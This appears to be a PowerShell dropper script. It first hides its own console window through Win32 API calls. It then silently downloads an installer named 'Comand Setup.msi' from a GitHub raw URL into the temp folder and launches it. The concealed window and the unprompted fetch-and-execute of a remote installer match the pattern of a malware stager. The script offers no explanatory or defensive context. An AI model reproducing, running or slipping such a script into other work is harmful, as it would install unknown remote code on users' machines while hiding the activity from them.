Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi"
$out = Join-Path $env:TEMP "Comand Setup.msi"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process $out
